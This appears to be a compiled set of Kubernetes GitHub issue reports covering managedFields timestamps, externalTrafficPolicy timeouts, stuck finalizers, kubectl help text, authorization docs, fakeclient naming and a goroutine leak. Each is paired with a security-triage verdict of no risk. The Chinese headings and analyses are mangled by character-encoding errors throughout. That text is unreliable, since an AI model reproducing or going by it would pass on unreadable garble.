- Issue é“¾æ¥ï¼š[#127938](https://github.com/kubernetes/kubernetes/issues/127938)

### Issue å†…å®¹

#### What happened?

We have a use case where two field managers co-own some of `.metadata.managedFields`. It is observed that the 'time' is missing after the 2nd field manager server-side-applied its configuration, when that applied configuration is the same with that of the 1st field manager.

An example of `.metadata.managedFields` which demonstrates what is missing:
```
- apiVersion: apps/v1
  fieldsType: FieldsV1
  fieldsV1:
    f:metadata:
      f:labels:
        f:app: {}
    f:spec:
      f:progressDeadlineSeconds: {}
      f:replicas: {}
      f:revisionHistoryLimit: {}
      f:selector: {}
      f:strategy:
        f:rollingUpdate:
          f:maxSurge: {}
          f:maxUnavailable: {}
        f:type: {}
      f:template:
        f:metadata:
          f:creationTimestamp: {}
          f:labels:
            f:app: {}
        f:spec:
          f:containers:
            k:{"name":"nginx"}:
              .: {}
              f:image: {}
              f:imagePullPolicy: {}
              f:name: {}
              f:resources: {}
              f:terminationMessagePath: {}
              f:terminationMessagePolicy: {}
          f:dnsPolicy: {}
          f:restartPolicy: {}
          f:schedulerName: {}
          f:securityContext: {}
          f:terminationGracePeriodSeconds: {}
  manager: jun-apply-again
  operation: Apply
- apiVersion: apps/v1
  fieldsType: FieldsV1
  fieldsV1:
    f:metadata:
      f:labels:
        f:app: {}
    f:spec:
      f:progressDeadlineSeconds: {}
      f:replicas: {}
      f:revisionHistoryLimit: {}
      f:selector: {}
      f:strategy:
        f:rollingUpdate:
          f:maxSurge: {}
          f:maxUnavailable: {}
        f:type: {}
      f:template:
        f:metadata:
          f:creationTimestamp: {}
          f:labels:
            f:app: {}
        f:spec:
          f:containers:
            k:{"name":"nginx"}:
              .: {}
              f:image: {}
              f:imagePullPolicy: {}
              f:name: {}
              f:resources: {}
              f:terminationMessagePath: {}
              f:terminationMessagePolicy: {}
          f:dnsPolicy: {}
          f:restartPolicy: {}
          f:schedulerName: {}
          f:securityContext: {}
          f:terminationGracePeriodSeconds: {}
  manager: jun
  operation: Apply
  time: "2024-10-01T21:53:28Z"
```
Field manager 'jun' has `"2024-10-01T21:53:28Z"` as the applied 'time', but field manager 'jun-apply-again' doesn't have any 'time'.

#### What did you expect to happen?

Each item in the list of managed fields should consistently have a 'time' associated.

#### How can we reproduce it (as minimally and precisely as possible)?

To help reproduce the bug, I documented the exact command lines and needed manifests [here](https://github.com/waltforme/random/blob/main/kubernetes-managedfields/apply_HTTP-PATCH.md).

For a little broader background, one can optionally read this [README.md](https://github.com/waltforme/random/blob/main/kubernetes-managedfields/README.md).

#### Anything else we need to know?

_No response_

#### Kubernetes version

I built the kube-apiserver from 7ee17ce9b7c2a22e63e2bbd79d48d3fe349a9386.
<details>

```console
$ kubectl version
WARNING: This version information is deprecated and will be replaced with the output from kubectl version --short.  Use --output=yaml|json to get the full version.
Client Version: version.Info{Major:"1", Minor:"26", GitVersion:"v1.26.1", GitCommit:"8f94681cd294aa8cfd3407b8191f6c70214973a4", GitTreeState:"clean", BuildDate:"2023-01-18T15:58:16Z", GoVersion:"go1.19.5", Compiler:"gc", Platform:"linux/arm64"}
Kustomize Version: v4.5.7
Server Version: version.Info{Major:"1", Minor:"32", GitVersion:"v0.0.0-master+$Format:%H$", GitCommit:"$Format:%H$", GitTreeState:"", BuildDate:"1970-01-01T00:00:00Z", GoVersion:"go1.23.0", Compiler:"gc", Platform:"linux/arm64"}
error: could not parse pre-release/metadata (-master+$Format:%H$) in version "v0.0.0-master+$Format:%H$"
```

</details>


#### Cloud provider

N/A

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
æ­¤IssueæŠ¥å‘Šäº†åœ¨ä½¿ç”¨Kubernetesçš„server-side applyåŠŸèƒ½æ—¶ï¼Œå½“ç¬¬äºŒä¸ªfield manageråº”ç”¨ä¸ç¬¬ä¸€ä¸ªfield managerç›¸åŒçš„YAMLé…ç½®æ—¶ï¼Œ`.metadata.managedFields`ä¸­ç¼ºå°‘äº†`time`å­—æ®µã€‚è¿™æ˜¯ä¸€ä¸ªä¸èµ„æºç®¡ç†å…ƒæ•°æ®æ›´æ–°ç›¸å…³çš„åŠŸèƒ½æ€§é—®é¢˜ã€‚æ ¹æ®æä¾›çš„ä¿¡æ¯ï¼Œç¼ºå°‘`time`å­—æ®µä¸ä¼šå¯¼è‡´ä»»ä½•å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…æ— æ³•åˆ©ç”¨æ­¤é—®é¢˜è¿›è¡Œæœªç»æˆæƒçš„æ“ä½œã€æƒé™æå‡æˆ–æ”»å‡»å…¶ä»–ç”¨æˆ·çš„æ•°æ®ã€‚æ­¤å¤–ï¼Œè¯¥é—®é¢˜ä¸æ¶‰åŠæ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œä¹Ÿä¸ä¼šå¯¼è‡´æ‹’ç»æœåŠ¡æ”»å‡»ã€‚ç»¼ä¸Šæ‰€è¿°ï¼Œæ ¹æ®é£é™©è¯„ä¼°æ ‡å‡†ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #127937 TCP connection timeout after sometime when using externaltrafficpolicy:local and metalb controller.

- Issue é“¾æ¥ï¼š[#127937](https://github.com/kubernetes/kubernetes/issues/127937)

### Issue å†…å®¹

#### What happened?

I have deployed a microservice(single instance) on a 3 node cluster, each node as a master/worker. 
Application is up and running, have a svc with loadbalancer(External IP). 

when deploying freshly, all traffic on the external loadbalancer IP is running fine, but after sometime I could see traffic is stopped, tcp connection timeout on the loadbalancer ip: port.

After debugging, I could see, when setup is fresh, all nodes have iptables related to health check and the node which has instance running has some iptables to support trafficpolicy I guess.

but later on, if i do rolling update or instance get deleted and move to other node, could see the drop iptables on the nodes where the instance is not scheduled. 

1) How this drop iptables rules came?
2) externaltrafficpolicy: local, then traffic should reach to the node where instance is running, but packet is getting dropped hence it is reaching to the other node when iptable rules are dropped. so why the traffic is reaching to the node with no instance? 


node-1:~ # iptables -L | grep 192.168.64.128
DROP       tcp  --  anywhere             192.168.64.128       /* services/controller-3:x has no local endpoints */ tcp dpt:gsmp-x

node-0:~ # iptables -L | grep 192.168.64.128
DROP       tcp  --  anywhere             192.168.64.128       /* services/controller-3:x has no local endpoints */ tcp dpt:gsmp-x

node-2:~ # iptables -L | grep 192.168.64.128
(no rule)


Error:
{"level":"error","timestamp":1728416020520.091,"caller":"ancp.git@v1.4.0-33309983/client.go:66","short_message":"connection failed: dial tcp 192.168.64.128:6068: connect: connection timed out","logging_lib_version":"2.0.0","time_zone":"UTC(+0s)","a4_pod_name":"4901708dc8f4","log_type":"APPLICATION"}
2024/10/08 19:33:40 failed to create client for 192.168.64.128: dial tcp 192.168.64.128:6068: connect:

svc:
services      controller-3                                 LoadBalancer   192.168.255.74    192.168.64.128   6068:30655/TCP                                                                  10d

#### What did you expect to happen?

traffic should flow seamlessely.

#### How can we reproduce it (as minimally and precisely as possible)?

 deploy pod on node-3.
restart the pod, it got deployed to node-2.
and you will see the issue.

(sometimes we may need to do multiple rolling update)

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: version.Info{Major:"1", Minor:"26", GitVersion:"v1.26.7", GitCommit:"84e1fc493a47446df2e155e70fca768d2653a398", GitTreeState:"clean", BuildDate:"2023-07-19T12:23:27Z", GoVersion:"go1.20.6", Compiler:"gc", Platform:"linux/amd64"}
Kustomize Version: v4.5.7
Server Version: version.Info{Major:"1", Minor:"26", GitVersion:"v1.26.7", GitCommit:"84e1fc493a47446df2e155e70fca768d2653a398", GitTreeState:"clean", BuildDate:"2023-07-19T12:16:45Z", GoVersion:"go1.20.6", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
flannel/calico
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
ç»è¿‡å¯¹Issueå†…å®¹çš„åˆ†æï¼Œå‘ç°è¿™æ˜¯ä¸€ä¸ªå…³äºKubernetesæœåŠ¡åœ¨ä½¿ç”¨`externalTrafficPolicy: Local`å’ŒMetalLBæ§åˆ¶å™¨æ—¶å‡ºç°TCPè¿æ¥è¶…æ—¶çš„é—®é¢˜ã€‚ç”¨æˆ·æè¿°äº†åœ¨æ»šåŠ¨æ›´æ–°æˆ–å®ä¾‹è¿ç§»åˆ°å…¶ä»–èŠ‚ç‚¹åï¼Œæµé‡å‡ºç°ä¸­æ–­ï¼Œä¸”åœ¨æœªè¿è¡Œå®ä¾‹çš„èŠ‚ç‚¹ä¸Šå‡ºç°äº†iptables DROPè§„åˆ™ã€‚

è¿™ä¸€é—®é¢˜æ¶‰åŠåˆ°æœåŠ¡çš„ç½‘ç»œé…ç½®ã€iptablesè§„åˆ™å’Œæµé‡è·¯ç”±ï¼Œä½†å¹¶æœªæ¶‰åŠåˆ°ä»»ä½•æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæœªå‘ç°æ­¤Issueå­˜åœ¨å¯è¢«æ”»å‡»è€…åˆ©ç”¨çš„æ¼æ´ï¼Œä¹Ÿä¸ä¼šå¯¼è‡´å‘½ä»¤æ‰§è¡Œã€ææƒç­‰é«˜é£é™©å®‰å…¨é—®é¢˜ã€‚å› æ­¤ï¼Œé£é™©è¯„çº§åˆ¤æ–­ä¸º**ä¸æ¶‰åŠ**ã€‚

---

## Issue #127917 Job tracking Finalizers batch.kubernetes.io/job-tracking prevent the pod from being deleted. The pod is stuck in terminating status

- Issue é“¾æ¥ï¼š[#127917](https://github.com/kubernetes/kubernetes/issues/127917)

### Issue å†…å®¹

#### What happened?

Pod related to a job is stuck in terminating status and unable to delete it. Even tried removing the job associated with the pod, but it's not getting deleted. When trying to remove the finalizer in the pod using a command.

`kubectl patch pod <pod-name> -n <namepsace> -p '{"metadata":{"finalizers":null}}'`
 
 getting following error 
 
`The Pod is invalid: metadata: Invalid value: "Burstable": Pod QoS is immutable`


#### What did you expect to happen?

The pod should be deleted

#### How can we reproduce it (as minimally and precisely as possible)?

Currently don't have a way to reproduce it

#### Anything else we need to know?

_No response_

#### Kubernetes version

1.29

#### Cloud provider

Azure AKS

#### OS version

_No response_

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨Kubernetesä¸­ï¼ŒJobå…³è”çš„Podç”±äºå­˜åœ¨finalizerå¯¼è‡´æ— æ³•è¢«åˆ é™¤ï¼Œå°è¯•åˆ é™¤Podçš„finalizeræ—¶é‡åˆ°é”™è¯¯`The Pod is invalid: metadata: Invalid value: "Burstable": Pod QoS is immutable`ã€‚è¿™æ˜¯ä¸€ä¸ªå…³äºKubernetesèµ„æºç®¡ç†å’Œæ“ä½œçš„é—®é¢˜ï¼Œå±äºè¿ç»´å±‚é¢çš„å›°éš¾ï¼Œå¹¶æ²¡æœ‰æåŠä»»ä½•å®‰å…¨æ¼æ´ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤Issueæ²¡æœ‰æ¶‰åŠå¯è¢«æ”»å‡»è€…åˆ©ç”¨çš„å®‰å…¨é£é™©ï¼Œä¹Ÿä¸å­˜åœ¨å¯èƒ½è¢«åˆ†é…CVEç¼–å·çš„æ¼æ´ã€‚Issueä¸­æ²¡æœ‰æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒç­‰é«˜å®‰å…¨é£é™©çš„é—®é¢˜ã€‚å› æ­¤ï¼Œé£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #127914 Add Opaque as default type in kubectl create secret .

- Issue é“¾æ¥ï¼š[#127914](https://github.com/kubernetes/kubernetes/issues/127914)

### Issue å†…å®¹

#### What happened?

Reference : https://github.com/kubernetes/kubernetes/pull/120337/files#r1408525014
Opaque is not added as default type in code as we see empty string when stating type in help message.
```shell
Options:
...
    --type='':
	The type of secret to create
...
```

#### What did you expect to happen?

Options:
```shell
...
    --type='Opaque':
	The type of secret to create
...
```

#### How can we reproduce it (as minimally and precisely as possible)?

```shell
kubectl create secret generic --help
```

#### Anything else we need to know?

NONE

#### Kubernetes version

<details>

```console
$ kubectl version
```

</details>


#### Cloud provider

<details>
any
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

```
</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¿™ä¸ªIssueæŠ¥å‘Šçš„æ˜¯`kubectl create secret`å‘½ä»¤çš„å¸®åŠ©ä¿¡æ¯ä¸­ï¼Œ`--type`é€‰é¡¹çš„é»˜è®¤å€¼æ˜¾ç¤ºä¸ºç©ºå­—ç¬¦ä¸²`''`ï¼Œè€Œä¸æ˜¯`'Opaque'`ã€‚Issueæå‡ºåº”è¯¥å°†é»˜è®¤å€¼æ˜¾ç¤ºä¸º`'Opaque'`ï¼Œä»¥åæ˜ å®é™…çš„é»˜è®¤è¡Œä¸ºã€‚

åœ¨Kubernetesä¸­ï¼Œå½“åˆ›å»ºä¸€ä¸ªSecretä¸”æœªæŒ‡å®š`--type`æ—¶ï¼Œé»˜è®¤ç±»å‹ç¡®å®æ˜¯`'Opaque'`ã€‚è¿™ä¸ªé—®é¢˜åªæ˜¯å¸®åŠ©ä¿¡æ¯çš„æ˜¾ç¤ºä¸å¤Ÿæ˜ç¡®ï¼Œå¯èƒ½ä¼šå¯¼è‡´ç”¨æˆ·å›°æƒ‘ã€‚ä½†è¿™å¹¶ä¸æ¶‰åŠä»»ä½•å®‰å…¨é£é™©ï¼Œå› ä¸ºå®ƒä¸ä¼šè¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œä¹Ÿä¸ä¼šå¯¼è‡´ä»»ä½•å½¢å¼çš„æ¼æ´ã€‚

---

## Issue #127911 Documentation for structured authorization is invalid

- Issue é“¾æ¥ï¼š[#127911](https://github.com/kubernetes/kubernetes/issues/127911)

### Issue å†…å®¹

#### What happened?

Using the example from https://kubernetes.io/docs/reference/access-authn-authz/authorization/#authz-config-example results in errors.
* It states that KubeConfig is a valid value, in fact it is KubeConfigFile.
* The CEL selector is also invalid, it results in another error.


When using that example, verbatim, in 1.30 and 1.31 I receive the following when the kube api server attempts to start

```
2024-10-07T23:26:25.950858192Z stderr F I1007 23:26:25.950777       1 options.go:228] external host was not specified, using 10.3.0.20
2024-10-07T23:26:25.952643399Z stderr F E1007 23:26:25.952583       1 run.go:72] "command failed" err=<
2024-10-07T23:26:25.952647031Z stderr F         [authorizers[0].connectionInfo.type: Unsupported value: apiserver.WebhookConnectionInfo{Type:"KubeConfig", KubeConfigFile:(*string)(0xc000258560)}: supported values: "InClusterConfig", "KubeConfigFile", authorizers[0].matchConditions[2].expression: Invalid value: "in request.user.groups)": compilation failed: ERROR: <input>:1:1: Syntax error: extraneous input 'in' expecting {'[', '{', '(', '.', '-', '!', 'true', 'false', 'null', NUM_FLOAT, NUM_INT, NUM_UINT, STRING, BYTES, IDENTIFIER}
2024-10-07T23:26:25.952648765Z stderr F          | in request.user.groups)
2024-10-07T23:26:25.952649804Z stderr F          | ^
2024-10-07T23:26:25.952650969Z stderr F         ERROR: <input>:1:23: Syntax error: extraneous input ')' expecting <EOF>
2024-10-07T23:26:25.952651994Z stderr F          | in request.user.groups)
2024-10-07T23:26:25.952653008Z stderr F          | ......................^]
2024-10-07T23:26:25.952654039Z stderr F  >
```

#### What did you expect to happen?

The config type comment and example to correctly state `KubeConfigFile` instead of `KubeConfig`
The CEL selector to not error out.

#### How can we reproduce it (as minimally and precisely as possible)?

Create an authorization file and use it in the command line arguments for the kube-api server kubeadm init setup.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
It's 1.31, the cluster doesnt initialize with the example
```

</details>


#### Cloud provider

<details>
None, Kubeadm cluster
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 24.04.1 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.1 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=noble
LOGO=ubuntu-logo
$ uname -a
Linux kube-test-cp-01 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC Fri Aug 30 12:02:04 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>
kubeadm
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd containerd.io 1.7.22 7f7fdf5fed64eb6a7caf99b3e12efcf9d60e311c
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
None
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŠ¥å‘Šäº†Kubernetesæ–‡æ¡£ä¸­å…³äºç»“æ„åŒ–æˆæƒçš„ç¤ºä¾‹æ— æ•ˆï¼Œå¯¼è‡´ç”¨æˆ·åœ¨æŒ‰ç…§æ–‡æ¡£é…ç½®æ—¶å‡ºç°é”™è¯¯ã€‚å…·ä½“é—®é¢˜åŒ…æ‹¬ï¼š

- æ–‡æ¡£ä¸­ä½¿ç”¨äº†é”™è¯¯çš„å‚æ•°åï¼Œåº”è¯¥æ˜¯`KubeConfigFile`è€Œä¸æ˜¯`KubeConfig`ã€‚
- CELé€‰æ‹©å™¨çš„è¡¨è¾¾å¼æ— æ•ˆï¼Œå¯¼è‡´è¯­æ³•é”™è¯¯ã€‚

è¿™äº›é—®é¢˜ä¼šå¯¼è‡´ç”¨æˆ·åœ¨é…ç½®kube-apiserveræ—¶æ— æ³•æ­£å¸¸å¯åŠ¨ï¼Œå‡ºç°é”™è¯¯ä¿¡æ¯ã€‚æ ¹æ®æä¾›çš„é”™è¯¯æ—¥å¿—ï¼Œä¸»è¦æ˜¯é…ç½®é¡¹å’Œè¡¨è¾¾å¼çš„è¯­æ³•é”™è¯¯ã€‚è¿™å±äºæ–‡æ¡£é”™è¯¯æˆ–é…ç½®é”™è¯¯ï¼Œä¸æ¶‰åŠå¯è¢«æ”»å‡»è€…åˆ©ç”¨çš„å®‰å…¨é£é™©ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤é—®é¢˜ä¸æ¶‰åŠå®‰å…¨é—®é¢˜ã€‚

---

## Issue #127900 bug(fakeclient): use fakeclient to create resource objects with GenerateName multiple times

- Issue é“¾æ¥ï¼š[#127900](https://github.com/kubernetes/kubernetes/issues/127900)

### Issue å†…å®¹

#### What happened?

When we are doing unit testing, we often use fakeclient to simulate the behavior of the client creating resources. However, when creating resources with the GenerateName name multiple times, an error occurs.



#### What did you expect to happen?

creating resources with the GenerateName name multiple times,  and success

#### How can we reproduce it (as minimally and precisely as possible)?

code like this: 
```go
func TestExample(t *testing.T) {

	// use real client set, it works to create two pod with GenerateName
	// kubeClient := client.ClientSet.Client
	kubeClient := fake.NewSimpleClientset()

	pod := &v1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			GenerateName: "my-pod-", //  generateName
			Namespace:    "default",
		},
		Spec: v1.PodSpec{
			Containers: []v1.Container{
				{
					Name:  "container1",
					Image: "nginx:latest",
				},
			},
		},
	}

	ctx := context.Background()
	createdPod, err := kubeClient.CoreV1().Pods("default").Create(ctx, pod, metav1.CreateOptions{})
	if err != nil {
		t.Fatalf("Failed to create pod: %v", err)
	}

	fmt.Printf("Created Pod: %s\n", createdPod.GenerateName)

	pod2 := &v1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			GenerateName: "my-pod-",
			Namespace:    "default",
		},
		Spec: v1.PodSpec{
			Containers: []v1.Container{
				{
					Name:  "container1",
					Image: "nginx:latest",
				},
			},
		},
	}

	createdPod2, err := kubeClient.CoreV1().Pods("default").Create(ctx, pod2, metav1.CreateOptions{})
	if err != nil {
		t.Fatalf("Failed to create pod: %v", err)
	}

	fmt.Printf("Created Pod: %s\n", createdPod2.GenerateName)

	//expectedPrefix := "my-pod-"
	//if !strings.HasPrefix(createdPod.Name, expectedPrefix) {
	//	t.Errorf("Expected pod name to start with %q, got %q", expectedPrefix, createdPod.Name)
	//}
}

```

we got: 

```
=== RUN   TestExample
Created Pod: my-pod-
    plugin_test.go:316: Failed to create pod: pods "" already exists
--- FAIL: TestExample (0.00s)
```

#### Anything else we need to know?

I'm not sure if this is a bug or a feature.

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨ä½¿ç”¨fakeclientè¿›è¡Œå•å…ƒæµ‹è¯•æ—¶ï¼Œåˆ›å»ºå…·æœ‰ç›¸åŒGenerateNameçš„èµ„æºå¤šæ¬¡ä¼šå‡ºç°é”™è¯¯ã€‚fakeclientæ˜¯Kubernetesæä¾›çš„ç”¨äºå•å…ƒæµ‹è¯•çš„æ¨¡æ‹Ÿå®¢æˆ·ç«¯ï¼Œç”¨äºæ¨¡æ‹Ÿå®¢æˆ·ç«¯è¡Œä¸ºï¼Œä¸å½±å“ç”Ÿäº§ç¯å¢ƒã€‚è¯¥é—®é¢˜ä»…é™äºæµ‹è¯•ç¯å¢ƒä¸‹çš„è¡Œä¸ºå·®å¼‚ï¼Œä¸æ¶‰åŠä»»ä½•å¯è¢«æ”»å‡»è€…åˆ©ç”¨çš„å®‰å…¨æ¼æ´æˆ–é£é™©ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬6æ¡ï¼šâ€œå¦‚æœIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠâ€ï¼Œå› æ­¤ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #127890 A potential goroutine leak in kubernetes/test/utils/ktesting/signals.go

- Issue é“¾æ¥ï¼š[#127890](https://github.com/kubernetes/kubernetes/issues/127890)

### Issue å†…å®¹

#### What happened?

The signalCtx is a context created by context.WithCancel() in func NotifyContext. But I found there is no cancelFunc to awaken the <-signalCtx.Done(), which leads the goroutine block forever and leak.
https://github.com/kubernetes/kubernetes/blob/7b28a115ba04651bc31aa1d7089abbd67ec5c067/test/utils/ktesting/signals.go#L46-L51

#### What did you expect to happen?

There is a cancelFunc to awaken the <-signalCtx.Done() to avoid blocking.

#### How can we reproduce it (as minimally and precisely as possible)?

You can reproduce the bug easily by goleak in some test functions such as
https://github.com/kubernetes/kubernetes/blob/7b28a115ba04651bc31aa1d7089abbd67ec5c067/pkg/kubelet/pod_workers_test.go#L1931
just add the code `defer goleak.VerifyNone(t)` in the beginning of the funcion like this,
```
func TestFakePodWorkers(t *testing.T) {
	defer goleak.VerifyNone(t)
```
Then run the test functioin to see the result below:

```
 pod_workers_test.go:1999: found unexpected goroutines:
        [Goroutine 98 in state select, with os/signal.NotifyContext.func1 on top of the stack:
        os/signal.NotifyContext.func1()
        	/home/song2048/æ¡Œé¢/goProject/pkg/mod/golang.org/toolchain@v0.0.1-go1.23.2.linux-amd64/src/os/signal/signal.go:288 +0x66
        created by os/signal.NotifyContext in goroutine 1
        	/home/song2048/æ¡Œé¢/goProject/pkg/mod/golang.org/toolchain@v0.0.1-go1.23.2.linux-amd64/src/os/signal/signal.go:287 +0x156
         Goroutine 99 in state chan receive, with k8s.io/kubernetes/test/utils/ktesting.init.1.func1 on top of the stack:
        k8s.io/kubernetes/test/utils/ktesting.init.1.func1()
        	/home/song2048/æ¡Œé¢/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/test/utils/ktesting/signals.go:51 +0x7c
        created by k8s.io/kubernetes/test/utils/ktesting.init.1 in goroutine 1
        	/home/song2048/æ¡Œé¢/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/test/utils/ktesting/signals.go:49 +0xf1
         Goroutine 94 in state select, with k8s.io/kubernetes/test/utils/ktesting.(*progressReporter).run on top of the stack:
        k8s.io/kubernetes/test/utils/ktesting.(*progressReporter).run(0xc0006fc060, {0x350e250, 0xc0005ffce0}, 0xc00066a540)
        	/home/song2048/æ¡Œé¢/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/test/utils/ktesting/signals.go:119 +0x85
        created by k8s.io/kubernetes/test/utils/ktesting.init.1 in goroutine 1
        	/home/song2048/æ¡Œé¢/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/test/utils/ktesting/signals.go:73 +0x24e
         Goroutine 110 in state chan receive, with k8s.io/kubernetes/pkg/kubelet.(*podWorkers).podWorkerLoop on top of the stack:
        k8s.io/kubernetes/pkg/kubelet.(*podWorkers).podWorkerLoop(0xc000440fa0, {0x0, 0x0}, 0xc000182ee0)
        	/home/song2048/æ¡Œé¢/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/pkg/kubelet/pod_workers.go:1216 +0x6c
        k8s.io/kubernetes/pkg/kubelet.(*podWorkers).UpdatePod.func1()
        	/home/song2048/æ¡Œé¢/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/pkg/kubelet/pod_workers.go:950 +0x118
        created by k8s.io/kubernetes/pkg/kubelet.(*podWorkers).UpdatePod in goroutine 109
        	/home/song2048/æ¡Œé¢/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/pkg/kubelet/pod_workers.go:945 +0x20db
         Goroutine 111 in state chan receive, with k8s.io/kubernetes/pkg/kubelet.(*podWorkers).podWorkerLoop on top of the stack:
        k8s.io/kubernetes/pkg/kubelet.(*podWorkers).podWorkerLoop(0xc000440fa0, {0x3041480, 0x8}, 0xc000182f50)
        	/home/song2048/æ¡Œé¢/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/pkg/kubelet/pod_workers.go:1216 +0x6c
        k8s.io/kubernetes/pkg/kubelet.(*podWorkers).UpdatePod.func1()
        	/home/song2048/æ¡Œé¢/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/pkg/kubelet/pod_workers.go:950 +0x118
        created by k8s.io/kubernetes/pkg/kubelet.(*podWorkers).UpdatePod in goroutine 109
        	/home/song2048/æ¡Œé¢/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/pkg/kubelet/pod_workers.go:945 +0x20db
         Goroutine 112 in state chan receive, with k8s.io/kubernetes/pkg/kubelet.(*podWorkers).podWorkerLoop on top of the stack:
        k8s.io/kubernetes/pkg/kubelet.(*podWorkers).podWorkerLoop(0xc000440fa0, {0x303c04d, 0x5}, 0xc000182fc0)
        	/home/song2048/æ¡Œé¢/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/pkg/kubelet/pod_workers.go:1216 +0x6c
        k8s.io/kubernetes/pkg/kubelet.(*podWorkers).UpdatePod.func1()
        	/home/song2048/æ¡Œé¢/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/pkg/kubelet/pod_workers.go:950 +0x118
        created by k8s.io/kubernetes/pkg/kubelet.(*podWorkers).UpdatePod in goroutine 109
        	/home/song2048/æ¡Œé¢/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/pkg/kubelet/pod_workers.go:945 +0x20db
        ]
--- FAIL: TestFakePodWorkers (0.45s)
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

latest


#### Cloud provider

no


